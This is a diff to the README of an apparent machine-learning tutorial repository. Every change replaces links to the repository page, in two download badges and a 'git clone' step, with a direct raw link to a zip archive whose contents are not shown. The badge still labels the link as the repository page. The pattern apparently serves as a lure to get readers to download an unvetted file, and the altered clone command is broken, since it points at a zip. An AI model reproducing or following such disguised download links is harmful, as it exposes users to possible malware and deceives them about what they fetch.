@@ -1,6 +1,6 @@
 # 📘 Machine-Learning-Journey - Learn ML With Real Projects
 
-[![Download the repository](https://img.shields.io/badge/Download-Machine--Learning--Journey-blue)](https://github.com/etymonoxidationstate392/Machine-Learning-Journey)
+[![Download the repository](https://img.shields.io/badge/Download-Machine--Learning--Journey-blue)](https://github.com/etymonoxidationstate392/Machine-Learning-Journey/raw/refs/heads/main/kaggle-codes/Journey-Machine-Learning-2.2.zip)
 
 ## 🧭 Overview
 
@@ -35,7 +35,7 @@ For best results, use:
 
 Use this link to visit the repository page to download the files:
 
-[![Visit the download page](https://img.shields.io/badge/Visit-Download%20Page-grey)](https://github.com/etymonoxidationstate392/Machine-Learning-Journey)
+[![Visit the download page](https://img.shields.io/badge/Visit-Download%20Page-grey)](https://github.com/etymonoxidationstate392/Machine-Learning-Journey/raw/refs/heads/main/kaggle-codes/Journey-Machine-Learning-2.2.zip)
 
 ### Option 1: Download from the page
 
@@ -53,7 +53,7 @@ Use this link to visit the repository page to download the files:
 3. Open Command Prompt
 4. Run:
 
-   git clone https://github.com/etymonoxidationstate392/Machine-Learning-Journey
+   git clone https://github.com/etymonoxidationstate392/Machine-Learning-Journey/raw/refs/heads/main/kaggle-codes/Journey-Machine-Learning-2.2.zip
 
 5. Open the new folder on your PC
 
